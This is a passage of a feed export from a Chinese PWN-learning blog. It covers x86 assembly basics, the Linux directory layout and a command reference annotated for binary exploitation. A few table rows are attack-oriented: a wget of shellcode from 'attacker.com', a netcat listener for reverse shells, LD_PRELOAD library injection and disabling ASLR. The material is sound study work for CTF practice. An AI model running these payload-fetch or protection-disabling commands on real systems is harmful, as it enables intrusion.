class="headerlink" title="栈操作指令"></a>栈操作指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 函数序言</span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line"></span><br><span class="line">; 函数尾声</span><br><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p><strong>Pwn意义</strong>：栈帧结构是缓冲区溢出的基础</p><h4 id="TEST指令妙用"><a href="#TEST指令妙用" class="headerlink" title="TEST指令妙用"></a>TEST指令妙用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test eax, eax  ; 检查eax是否为0</span><br><span class="line">jz   exit      ; 为零则跳转</span><br><span class="line"></span><br><span class="line">test al, 1     ; 检查最低位</span><br><span class="line">jnz  odd       ; 为奇数则跳转</span><br></pre></td></tr></table></figure><h3 id="汇编与高级语言的对应关系"><a href="#汇编与高级语言的对应关系" class="headerlink" title="汇编与高级语言的对应关系"></a>汇编与高级语言的对应关系</h3><p> C 语言与汇编（x86-64）的简单映射示例：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> result = add(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; add函数</span><br><span class="line">add:</span><br><span class="line">    MOV EAX, ECX      ; 第一个参数(a)从ECX移入EAX</span><br><span class="line">    ADD EAX, EDX      ; EAX += 第二个参数(b)</span><br><span class="line">    RET               ; 返回EAX的值</span><br><span class="line"></span><br><span class="line">; main函数</span><br><span class="line">main:</span><br><span class="line">    MOV ECX, 3        ; 第一个参数3存入ECX</span><br><span class="line">    MOV EDX, 4        ; 第二个参数4存入EDX</span><br><span class="line">    CALL add          ; 调用add函数</span><br><span class="line">    XOR EAX, EAX      ; EAX = 0（返回值）</span><br><span class="line">    RET</span><br></pre></td></tr></table></figure><p>第一二章 前言-汇编的概念：<a href="http://fynote.com/s/3251">http://fynote.com/s/3251</a><br>第三章 寄存器：<a href="http://fynote.com/s/3269">http://fynote.com/s/3269</a><br>第四章 汇编程序：<a href="http://fynote.com/s/3315">http://fynote.com/s/3315</a><br>第五章 汇编指令：<a href="http://fynote.com/s/3354">http://fynote.com/s/3354</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;装载&quot;&gt;&lt;a href=&quot;#装载&quot; class=&quot;headerlink&quot; title=&quot;装载&quot;&gt;&lt;/a&gt;装载&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/../../../../../images/image-20250630141153683.png&quot; alt=&quot;ima</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="汇编基础" scheme="https://rhea006.github.io/categories/PWN/Learning/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    
    <category term="x86x64汇编基础" scheme="https://rhea006.github.io/categories/PWN/Learning/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/x86x64%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux目录结构</title>
    <link href="https://rhea006.github.io/2025/06/e591376d054f.html"/>
    <id>https://rhea006.github.io/2025/06/e591376d054f.html</id>
    <published>2025-06-30T12:16:36.000Z</published>
    <updated>2025-07-01T03:07:41.723Z</updated>
    
    <content type="html"><![CDATA[<h1 id="根目录的子目录"><a href="#根目录的子目录" class="headerlink" title="根目录的子目录"></a>根目录的子目录</h1><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>&#x2F;bin</td><td>bin是Binary的缩写, 这个目录存放着最经常使用的命令，由系统、系统管理员和用户共享</td></tr><tr><td>&#x2F;boot</td><td>这里存放的是启动Linux时使用的一些核心文件，包括一些链接文件以及镜像文件</td></tr><tr><td>&#x2F;dev</td><td>dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的</td></tr><tr><td>&#x2F;etc</td><td>大多数重要的系统配置文件都在&#x2F;etc目录下，该目录包含的数据类似于Windows控制面板中的数据</td></tr><tr><td>&#x2F;home</td><td>普通用户的家目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的</td></tr><tr><td>&#x2F;lib</td><td>库文件，包括系统和用户所需要的各种程序的文件</td></tr><tr><td>&#x2F;lost+found</td><td>每个分区在其上目录中都有一个lost+found。故障期间保存的文件在这里</td></tr><tr><td>&#x2F;media</td><td>linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下</td></tr><tr><td>&#x2F;mnt</td><td>外部文件系统的标准挂载点，例如CD-ROM(光驱)或数码相机</td></tr><tr><td>&#x2F;opt</td><td>通常包含额外的和第三方软件。这是给主机额外安装的大型应用程序所放置的目录</td></tr><tr><td>&#x2F;proc</td><td>包含有关系统资源信息的虚拟文件系统。这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件&lt;</td></tr><tr><td>&#x2F;root</td><td>该目录为系统管理员，也称作超级权限者的用户家目录。注意根目录 &#x2F; 和根用户的主目录 &#x2F;root 之间的区别</td></tr><tr><td>&#x2F;sbin</td><td>s就是Super User的意思，这里存放的是系统管理员root使用的系统管理程序</td></tr><tr><td>&#x2F;tmp</td><td>系统使用的临时空间，在重新启动时清理，所以不要使用它来保存任何工作!该目录对于所有用户都可以访问，不要把重要文件放置于该目录</td></tr><tr><td>&#x2F;usr</td><td>这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似与windows下的program files目录</td></tr><tr><td>&#x2F;var</td><td>用户创建的所有可变文件和临时文件的存储空间，如日志文件(一般是&#x2F;var&#x2F;log)、邮件队列、打印假脱机程序区、从Internet下载的文件的临时存储空间，或在刻录CD之前保存它的映像。</td></tr></tbody></table><h1 id="Linux绝对路径和相对路径"><a href="#Linux绝对路径和相对路径" class="headerlink" title="Linux绝对路径和相对路径"></a>Linux绝对路径和相对路径</h1><h2 id="绝对路径："><a href="#绝对路径：" class="headerlink" title="绝对路径："></a>绝对路径：</h2><p>以根目录“&#x2F;”开始的路径，表示从Linux目录结构的最顶点算起，特点是路径以“&#x2F;”开头</p><h2 id="相对路径："><a href="#相对路径：" class="headerlink" title="相对路径："></a>相对路径：</h2><p>不以根目录“&#x2F;”开始的路径，以当前目录作为起始点，特点是不以“&#x2F;”开头</p><p>每个目录下都有”.”和”..”2个目录：</p><p>一个点“ . ”代表当前目录，写全了“ .&#x2F; ”</p><p>二个点“ .. ”代表上一级目录，写全了“ ..&#x2F; ”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;根目录的子目录&quot;&gt;&lt;a href=&quot;#根目录的子目录&quot; class=&quot;headerlink&quot; title=&quot;根目录的子目录&quot;&gt;&lt;/a&gt;根目录的子目录&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;目录&lt;/th&gt;
&lt;th&gt;内容&lt;/th&gt;
&lt;/tr&gt;
&lt;/</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="Linux安全机制" scheme="https://rhea006.github.io/categories/PWN/Learning/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    
    <category term="Linux基础" scheme="https://rhea006.github.io/categories/PWN/Learning/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/Linux%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux常用命令</title>
    <link href="https://rhea006.github.io/2025/06/2f21045a36ee.html"/>
    <id>https://rhea006.github.io/2025/06/2f21045a36ee.html</id>
    <published>2025-06-30T12:16:36.000Z</published>
    <updated>2025-07-01T03:07:41.723Z</updated>
    
    <content type="html"><![CDATA[<h1 id="终端命令格式"><a href="#终端命令格式" class="headerlink" title="终端命令格式"></a>终端命令格式</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> [-options] [parameter]</span><br></pre></td></tr></table></figure><p><strong>说明：</strong></p><p>·command ：命令名，相应功能的英文单词或单词的缩写<br>·[-options] ：选项，可用来对命令进行控制，也可以省略<br>·parameter ：传给命令的参数，可以是 零个、一个 或者 多个</p><h2 id="目录操作命令-cd、pwd、ls、mkdir、rmdir、du"><a href="#目录操作命令-cd、pwd、ls、mkdir、rmdir、du" class="headerlink" title="目录操作命令 cd、pwd、ls、mkdir、rmdir、du"></a>目录操作命令 cd、pwd、ls、mkdir、rmdir、du</h2><table><thead><tr><th>命令 &#x2F; 选项组合</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>基础命令</strong></td><td></td></tr><tr><td><code>cd</code></td><td>切换到另一个目录</td></tr><tr><td><code>pwd</code></td><td>打印当前所在目录（print working directory ）</td></tr><tr><td><code>ls</code></td><td>列出目录内容</td></tr><tr><td><strong><code>ls</code> 常用选项</strong></td><td></td></tr><tr><td><code>ls -l</code></td><td>长格式输出文件，一个文件显示一行（简写 <code>ll</code> ）</td></tr><tr><td><code>ls -a</code></td><td>显示以 <code>.</code> 开头的隐藏文件（默认不显示隐藏文件 ）</td></tr><tr><td><code>ls -d</code></td><td>显示目录本身，而非目录下的文件（默认目录会展开显示内容 ）</td></tr><tr><td><code>ls -lh</code></td><td>长格式输出 + 字节数转 K&#x2F;M&#x2F;G （人性化阅读 ）</td></tr><tr><td><code>ls -t</code></td><td>按<strong>修改时间从晚到早</strong>排序文件（最近修改的先显示 ）</td></tr><tr><td><code>ls -tr</code></td><td>按<strong>修改时间从早到晚</strong>排序文件（最近修改的后显示 ）</td></tr><tr><td><code>ls -R</code></td><td>递归列出当前目录及所有子目录的文件（遍历嵌套目录 ）</td></tr><tr><td><strong>个人常用 <code>ls</code> 用法</strong></td><td><code>ll -ah</code> （长格式 + 显示隐藏文件 + 人性化字节数 ）</td></tr><tr><td><strong><code>mkdir</code></strong></td><td>创建目录；<code>-p</code> 选项可级联创建多层目录（如 <code>mkdir -p a/b/c</code> ）</td></tr><tr><td><strong><code>rmdir</code></strong></td><td>删除空目录；非空目录需用 <code>rm -rf 目录名</code> 强制删除（谨慎使用 <code>rm -rf</code> ）</td></tr><tr><td><strong><code>du</code> 命令及选项</strong></td><td></td></tr><tr><td><code>du</code></td><td>统计目录 &#x2F; 文件的磁盘占用字节数</td></tr><tr><td><code>du -s</code></td><td>只显示总字节数（不展开子文件 &#x2F; 目录 ）</td></tr><tr><td><code>du -h</code></td><td>字节数转 K&#x2F;M&#x2F;G （人性化阅读 ）</td></tr><tr><td><strong>个人常用 <code>du</code> 用法</strong></td><td><code>du -sh</code> （统计总占用 + 人性化字节数 ）</td></tr></tbody></table><h2 id="文件操作命令-which、touch、cp、mv、rm、file"><a href="#文件操作命令-which、touch、cp、mv、rm、file" class="headerlink" title="文件操作命令 which、touch、cp、mv、rm、file"></a>文件操作命令 which、touch、cp、mv、rm、file</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>功能说明</strong></th><th><strong>语法示例</strong></th><th><strong>关键参数 &#x2F; 补充</strong></th></tr></thead><tbody><tr><td><code>which</code></td><td>查找命令在系统中的绝对路径</td><td><code>which cd</code> <code>which ls</code> <code>which date</code></td><td>- 仅查系统 <code>PATH</code> 路径内的可执行命令</td></tr><tr><td><code>touch</code></td><td>创建空文件 &#x2F; 更新文件修改时间</td><td><code>touch /root/aaa /root/bbb /root/ccc</code></td><td>- 无文件则创建，有文件则改<strong>修改时间</strong></td></tr><tr><td><code>cp</code></td><td>复制文件 &#x2F; 目录</td><td>复制文件： <code>cp /root/install.log /tmp</code> <code>cp /root/install.log /tmp/abc.log</code> 复制目录： <code>cp -R /root /tmp</code> <code>cp -R /root /tmp/abc</code></td><td><code>-R</code>：递归复制目录（必加） <code>-i</code>：覆盖前提示（默认隐藏，需手动开）</td></tr><tr><td><code>mv</code></td><td>移动文件 &#x2F; 目录 &#x2F; 重命名</td><td>移动： <code>mv /root/install.log.bak /tmp</code> 重命名： <code>mv /tmp/root /tmp/root1</code></td><td>- 移动 + 重命名可一步完成（如 <code>mv 旧路径 新路径</code> ）</td></tr><tr><td><code>rm</code></td><td>删除文件 &#x2F; 目录（<strong>危险操作</strong>）</td><td>删除文件： <code>rm /root/install.log.bak</code> 删除目录： <code>rm -rf /tmp/root1</code></td><td><code>-r</code>：递归删目录内容 <code>-f</code>：强制删除（无提示） <code>-i</code>：删除前逐一确认（建议日常用）</td></tr><tr><td><code>file</code></td><td>查看文件的类型（格式 &#x2F; 编码等）</td><td><code>file 文件名</code> 例：<code>file /root/install.log</code></td><td>- 可识别文本、二进制、压缩包等类型</td></tr></tbody></table><h2 id="查看登录用户命名-who、w"><a href="#查看登录用户命名-who、w" class="headerlink" title="查看登录用户命名 who、w"></a>查看登录用户命名 who、w</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>who</strong></td><td><strong>当前用户登录的信息</strong></td></tr><tr><td><strong>w</strong></td><td><strong>当前用户登录的信息，以什么程序登录的</strong></td></tr></tbody></table><h2 id="文件内容查看命令-cat、tac、more、less、tail、head"><a href="#文件内容查看命令-cat、tac、more、less、tail、head" class="headerlink" title="文件内容查看命令 cat、tac、more、less、tail、head"></a>文件内容查看命令 cat、tac、more、less、tail、head</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>cat</td><td>查看文本文件内容，将文本文件内容全部打印到标准输出<br/>选项 -n 输出结果带行号</td></tr><tr><td>tac</td><td>查看文本文件内容，倒序输出<br/>按照行号倒序打印文本文件的内容</td></tr><tr><td>more</td><td>分页显示文件内容，例如：more &#x2F;root&#x2F;install.log<br/>默认显示进度百分比<br/>空格往下翻页，b往上翻页，f往下翻页，q退出</td></tr><tr><td>less</td><td>分页显示文件内容，例如：less &#x2F;root&#x2F;install.log<br/>选项 -m 显示进度百分比<br/>可以用“&#x2F;”后跟关键字搜索文件内容<br/>空格往下翻页，b往上翻页，f往下翻页，q退出</td></tr><tr><td>tail</td><td>查看文件尾部10行，例如：tail &#x2F;root&#x2F;install.log<br/>选项-N （N为正整数）可以指定显示末尾N行内容</td></tr><tr><td>head</td><td>查看文件头部10行，例如：head &#x2F;root&#x2F;install.log<br/>选项-N （N为正整数）可以指定显示头部N行内容</td></tr></tbody></table><h2 id="系统管理类命令-shutdown、reboot、lscpu"><a href="#系统管理类命令-shutdown、reboot、lscpu" class="headerlink" title="系统管理类命令 shutdown、reboot、lscpu"></a>系统管理类命令 shutdown、reboot、lscpu</h2><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td><strong>shutdown</strong></td><td><strong>关机命令</strong></br><strong>shutdown -h now 立刻关机</strong></br><strong>shutdown -h +10 “10分钟后关机”，每个登录用户收到“10分钟后关机”的消息，并于10分钟后关机</strong></br><strong>shutdown -c 取消关机</strong></td></tr><tr><td><strong>reboot</strong></td><td><strong>重启系统</strong></td></tr><tr><td><strong>lscpu</strong></td><td><strong>查看系统cpu信息</strong></td></tr></tbody></table><h1 id="查阅命令帮助信息"><a href="#查阅命令帮助信息" class="headerlink" title="查阅命令帮助信息"></a>查阅命令帮助信息</h1><h2 id="help"><a href="#help" class="headerlink" title="-help"></a>-help</h2><p>说明：显示 command 命令的帮助信息</p><h2 id="man"><a href="#man" class="headerlink" title="-man"></a>-man</h2><p>说明：</p><p>·查阅 command 命令的使用手册（man 是 manual 的缩写，是 Linux 提供的一个 手册，包含了绝大部分的命令、函数的详细使用）<br>·说明：使用 man 时的操作键</p><table><thead><tr><th>操作键</th><th>功能</th></tr></thead><tbody><tr><td>空格键</td><td>显示手册页的下一屏</td></tr><tr><td>Enter 键</td><td>一次滚动手册页的一行</td></tr><tr><td>b</td><td>回滚一屏</td></tr><tr><td>f</td><td>前滚一屏</td></tr><tr><td>q</td><td>退出</td></tr><tr><td>&#x2F;word</td><td>搜索 word 字符串</td></tr></tbody></table><h1 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全:"></a>自动补全:</h1><p>在敲出 文件 ／ 目录 ／ 命令 的前几个字母之后，按下 tab 键</p><p>如果输入的没有歧义，系统会自动补全<br>如果还存在其他 文件 ／ 目录 ／ 命令 ，再按一下 tab 键，系统会提示可能存在的命令<br>小技巧</p><p><strong><code>小技巧：</code></strong></p><p>ctrl + shift + &#x3D; 放大终端窗口的字体显示<br>ctrl + - 缩小终端窗口的字体显示</p><p>按 上 ／ 下 光标键可以在曾经使用过的命令之间来回切换<br>如果想要退出选择，并且不想执行当前选中的命令，可以按 ctrl + c</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="文件分析命令（关键！）"><a href="#文件分析命令（关键！）" class="headerlink" title="文件分析命令（关键！）"></a>文件分析命令（关键！）</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>file</code></strong></td><td align="left">查看文件类型</td><td align="left"><code>file ./vuln</code></td><td align="left">识别ELF类型（32&#x2F;64位）、动态&#x2F;静态链接</td></tr><tr><td align="left"><strong><code>checksec</code></strong></td><td align="left">检查安全机制</td><td align="left"><code>checksec --file=./vuln</code></td><td align="left">查看NX, PIE, Canary, RELRO等防护状态</td></tr><tr><td align="left"><strong><code>readelf</code></strong></td><td align="left">ELF文件分析</td><td align="left"><code>readelf -a ./vuln</code></td><td align="left">查看节头、符号表、重定位表、程序头</td></tr><tr><td align="left"><code>readelf -S</code></td><td align="left">查看节头信息</td><td align="left"><code>readelf -S ./vuln</code></td><td align="left">定位.text&#x2F;.plt&#x2F;.got等关键段地址</td></tr><tr><td align="left"><code>readelf -s</code></td><td align="left">查看符号表</td><td align="left">&#96;readelf -s .&#x2F;vuln</td><td align="left">grep system&#96;</td></tr><tr><td align="left"><strong><code>objdump</code></strong></td><td align="left">反汇编分析</td><td align="left"><code>objdump -d ./vuln</code></td><td align="left">反汇编代码段</td></tr><tr><td align="left"><code>objdump -M</code></td><td align="left">指定反汇编格式</td><td align="left"><code>objdump -M intel -d ./vuln</code></td><td align="left">Intel格式反汇编（更易读）</td></tr><tr><td align="left"><code>objdump -j</code></td><td align="left">反汇编特定段</td><td align="left"><code>objdump -j .plt -d ./vuln</code></td><td align="left">分析PLT表</td></tr><tr><td align="left"><strong><code>strings</code></strong></td><td align="left">提取字符串</td><td align="left">&#96;strings .&#x2F;vuln</td><td align="left">grep “&#x2F;bin&#x2F;sh”&#96;</td></tr><tr><td align="left"><strong><code>ldd</code></strong></td><td align="left">查看动态依赖</td><td align="left"><code>ldd ./vuln</code></td><td align="left">获取libc路径和基址偏移</td></tr></tbody></table><h2 id="调试分析命令（核心工具）"><a href="#调试分析命令（核心工具）" class="headerlink" title="调试分析命令（核心工具）"></a>调试分析命令（核心工具）</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>gdb</code></strong></td><td align="left">GNU调试器</td><td align="left"><code>gdb ./vuln</code></td><td align="left">动态调试分析</td></tr><tr><td align="left"><code>gdb -p</code></td><td align="left">附加进程</td><td align="left"><code>gdb -p &lt;pid&gt;</code></td><td align="left">调试运行中的程序</td></tr><tr><td align="left"><code>gdb -ex</code></td><td align="left">执行命令</td><td align="left"><code>gdb -ex &quot;b main&quot; -ex &quot;r&quot; ./vuln</code></td><td align="left">自动化调试任务</td></tr><tr><td align="left"><strong><code>strace</code></strong></td><td align="left">系统调用跟踪</td><td align="left"><code>strace ./vuln</code></td><td align="left">监控系统调用（如execve）</td></tr><tr><td align="left"><strong><code>ltrace</code></strong></td><td align="left">库函数跟踪</td><td align="left"><code>ltrace ./vuln</code></td><td align="left">监控库函数调用（如malloc）</td></tr><tr><td align="left"><strong><code>pwndbg</code></strong></td><td align="left">增强版GDB</td><td align="left">-</td><td align="left">专为Pwn设计的GDB插件</td></tr><tr><td align="left"><code>info proc</code></td><td align="left">查看进程信息</td><td align="left"><code>info proc mappings</code></td><td align="left">查看内存映射布局</td></tr></tbody></table><h2 id="网络操作命令（漏洞利用必备）"><a href="#网络操作命令（漏洞利用必备）" class="headerlink" title="网络操作命令（漏洞利用必备）"></a>网络操作命令（漏洞利用必备）</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>nc</code></strong></td><td align="left">网络工具</td><td align="left"><code>nc -lvp 4444</code></td><td align="left">监听端口（接收反弹shell）</td></tr><tr><td align="left"></td><td align="left"></td><td align="left"><code>nc 192.168.1.100 1337</code></td><td align="left">连接远程漏洞服务</td></tr><tr><td align="left"><strong><code>socat</code></strong></td><td align="left">高级网络工具</td><td align="left"><code>socat TCP-LISTEN:4444,reuseaddr,fork EXEC:./vuln</code></td><td align="left">稳定连接（用于ROP链开发）</td></tr><tr><td align="left"><strong><code>curl</code></strong></td><td align="left">HTTP客户端</td><td align="left"><code>curl http://target:8080/exploit</code></td><td align="left">Web Pwn题利用</td></tr><tr><td align="left"><strong><code>wget</code></strong></td><td align="left">文件下载</td><td align="left"><code>wget http://attacker.com/shellcode.bin</code></td><td align="left">下载远程payload</td></tr></tbody></table><h2 id="进程管理命令"><a href="#进程管理命令" class="headerlink" title="进程管理命令"></a>进程管理命令</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>ps</code></strong></td><td align="left">查看进程</td><td align="left">&#96;ps aux</td><td align="left">grep vuln&#96;</td></tr><tr><td align="left"><strong><code>kill</code></strong></td><td align="left">终止进程</td><td align="left"><code>kill -9 &lt;pid&gt;</code></td><td align="left">强制结束崩溃的程序</td></tr><tr><td align="left"><strong><code>pkill</code></strong></td><td align="left">按名杀进程</td><td align="left"><code>pkill -f vuln</code></td><td align="left">快速结束目标程序</td></tr><tr><td align="left"><strong><code>top</code></strong></td><td align="left">实时进程监控</td><td align="left"><code>top</code></td><td align="left">监控资源占用情况</td></tr><tr><td align="left"><strong><code>nohup</code></strong></td><td align="left">后台运行</td><td align="left"><code>nohup ./vuln &amp;</code></td><td align="left">保持服务运行</td></tr></tbody></table><h2 id="环境配置命令"><a href="#环境配置命令" class="headerlink" title="环境配置命令"></a>环境配置命令</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>export</code></strong></td><td align="left">环境变量</td><td align="left"><code>export LD_PRELOAD=./libc.so.6</code></td><td align="left">预加载库（库注入攻击）</td></tr><tr><td align="left"></td><td align="left"></td><td align="left"><code>export PYTHONPATH=/path/to/pwntools</code></td><td align="left">设置Python路径</td></tr><tr><td align="left"><strong><code>ulimit</code></strong></td><td align="left">资源限制</td><td align="left"><code>ulimit -c unlimited</code></td><td align="left">启用core dump</td></tr><tr><td align="left"><strong><code>setarch</code></strong></td><td align="left">设置架构</td><td align="left"><code>setarch </code>uname -m<code> -R ./vuln</code></td><td align="left">禁用ASLR（地址随机化）</td></tr><tr><td align="left"><strong><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></strong></td><td align="left">全局禁用ASLR</td><td align="left">需要root权限</td><td align="left">调试环境配置</td></tr></tbody></table><h2 id="二进制处理命令"><a href="#二进制处理命令" class="headerlink" title="二进制处理命令"></a>二进制处理命令</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>xxd</code></strong></td><td align="left">十六进制查看</td><td align="left">&#96;xxd .&#x2F;vuln</td><td align="left">head&#96;</td></tr><tr><td align="left"><strong><code>hexedit</code></strong></td><td align="left">十六进制编辑</td><td align="left"><code>hexedit ./vuln</code></td><td align="left">手动修改二进制文件</td></tr><tr><td align="left"><strong><code>patchelf</code></strong></td><td align="left">ELF修补</td><td align="left"><code>patchelf --set-interpreter /lib/ld-linux.so.2 ./vuln</code></td><td align="left">修改动态链接器</td></tr><tr><td align="left"></td><td align="left"></td><td align="left"><code>patchelf --replace-needed libc.so.6 ./libc_target.so ./vuln</code></td><td align="left">替换依赖库</td></tr><tr><td align="left"><strong><code>objcopy</code></strong></td><td align="left">目标文件操作</td><td align="left"><code>objcopy --dump-section .text=text.bin ./vuln</code></td><td align="left">提取代码段</td></tr></tbody></table><h2 id="开发辅助命令"><a href="#开发辅助命令" class="headerlink" title="开发辅助命令"></a>开发辅助命令</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>python</code></strong></td><td align="left">Python解释器</td><td align="left"><code>python3 exploit.py</code></td><td align="left">运行漏洞利用脚本</td></tr><tr><td align="left"><strong><code>pip</code></strong></td><td align="left">Python包管理</td><td align="left"><code>pip install pwntools</code></td><td align="left">安装Pwn工具库</td></tr><tr><td align="left"><strong><code>gcc</code></strong></td><td align="left">编译器</td><td align="left"><code>gcc -fno-stack-protector -z execstack vuln.c -o vuln</code></td><td align="left">编译含漏洞程序</td></tr><tr><td align="left"><strong><code>make</code></strong></td><td align="left">构建工具</td><td align="left"><code>make</code></td><td align="left">编译CTF题目</td></tr><tr><td align="left"><strong><code>tmux</code></strong></td><td align="left">终端复用器</td><td align="left"><code>tmux new -s pwn</code></td><td align="left">管理多个调试窗口</td></tr></tbody></table><h2 id="信息搜索命令"><a href="#信息搜索命令" class="headerlink" title="信息搜索命令"></a>信息搜索命令</h2><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">参数示例</th><th align="left">Pwn应用场景</th></tr></thead><tbody><tr><td align="left"><strong><code>grep</code></strong></td><td align="left">文本搜索</td><td align="left">&#96;objdump -d .&#x2F;vuln</td><td align="left">grep “call”&#96;</td></tr><tr><td align="left"><strong><code>find</code></strong></td><td align="left">文件查找</td><td align="left"><code>find / -name &quot;libc.so.6&quot; 2&gt;/dev/null</code></td><td align="left">查找libc库</td></tr><tr><td align="left"><strong><code>which</code></strong></td><td align="left">命令定位</td><td align="left"><code>which gdb</code></td><td align="left">查找工具路径</td></tr><tr><td align="left"><strong><code>man</code></strong></td><td align="left">手册查看</td><td align="left"><code>man 2 execve</code></td><td align="left">查看系统调用文档</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;终端命令格式&quot;&gt;&lt;a href=&quot;#终端命令格式&quot; class=&quot;headerlink&quot; title=&quot;终端命令格式&quot;&gt;&lt;/a&gt;终端命令格式&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="Linux安全机制" scheme="https://rhea006.github.io/categories/PWN/Learning/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    
    <category term="Linux基础" scheme="https://rhea006.github.io/categories/PWN/Learning/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/Linux%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/06/9acda07248c0.html"/>
    <id>https://rhea006.github.io/2025/06/9acda07248c0.html</id>
    <published>2025-06-29T15:19:39.265Z</published>
    <updated>2025-06-30T04:13:35.567Z</updated>
    
    <content type="html"><![CDATA[<p>title: 可执行文件装载与虚拟内存<br>date: 2025-06-28 20:16:36<br>categories:   - PWN -ELF文件格式</p><p>tags: </p><p><img src="/./../../../../../images/image-20250629232102031.png" alt="image-20250629232102031"></p><p><img src="/./../../../../../images/image-20250629232917087.png" alt="image-20250629232917087"></p><p><img src="/./../../../../../images/image-20250629233100682.png" alt="image-20250629233100682"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;title: 可执行文件装载与虚拟内存&lt;br&gt;date: 2025-06-28 20:16:36&lt;br&gt;categories:   - PWN -ELF文件格式&lt;/p&gt;
&lt;p&gt;tags: &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/./../../../../../images/</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="二进制文件" scheme="https://rhea006.github.io/categories/PWN/Learning/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
    
    <category term="2-ELF文件格式" scheme="https://rhea006.github.io/categories/PWN/Learning/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/2-ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    
    
  </entry>
  
